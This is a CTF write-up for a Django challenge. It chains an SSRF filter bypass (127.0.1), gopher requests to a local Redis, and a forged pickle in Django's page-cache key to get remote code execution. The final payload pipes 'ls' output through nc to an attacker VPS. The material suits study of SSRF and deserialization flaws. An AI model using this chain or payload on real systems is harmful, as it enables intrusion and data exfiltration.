# Shinobis World (1000pts) (1 Solves) #

![TASK](https://imgur.com/7X3dgtW.png)

Hello guys again , in this task we are give the Settings.py of a django Web application , we can notice that the website is using caching with redis that is listening on port 6379 locally !

![TASK](https://imgur.com/60QSkz4.png)

Our first impression, we see an url fetcher that is curling websites which will be probably some SSRF , we try the usual payloads and we find that file ,localhost and 127.0.0.1 are filtered 
so we can use 127.0.1 and maybe http or gopher protocol , firstly let's think , as we said we had a redis instance that is running on localhost , so may be using the ssrf we can interact with it

in fact you can use gopher protocol to interact with redis :

> gopher://127.0.1:6379/_RedisCommandHERE

for example to list all keys:

>> gopher://127.0.1:6379/_keys%20*

if we refresh the shinobis web page and then list all keys we can see some new keys that are set :

> :1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC
>> :1:views.decorators.cache.cache_header..a906279c6f1b8c76747a8ba71e866d8c.en-us.UTC 

![TASK](https://imgur.com/bOKKP3k.png)

If you read the Django Manual you will find that the caching system in django is a little bit different , first of all django will serialize the header and the rest of the page using pickle then it will cache them in the memory

So the idea is to forge our payload using pickle and the set the default key of django (:1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC) with our payload , here is what will happen chronologically :
- Django will try to load the page so firstly he will check if the :1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC key is set 
- if the key is set he will unpickle the data stored there and load the page using this content
- Our payload will be executed then Bingo we will have the flag :D

Final Payload : 
> gopher://127.0.1:6379/aset%20:1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC%20"cposix\nsystem\np0\n(S'ls|nc YourVPSIP 1234'\np1\ntp2\nRp3\n."
This Payload will execute ls command and send it to our vps (don't forget to refresh the Shinobis page because it's the page that is being cached)

***Note:*** You can find the source code of this task in source code repo

**Conclusion**

I hope that you liked the challenge , i tried to combine the SSRF with this default feature of django that can be used maliciously , it can be applied with any caching system (Memcached or Redis ..)
If you have any questions dont forget to contact me and if you liked this writeup please star this repo :D
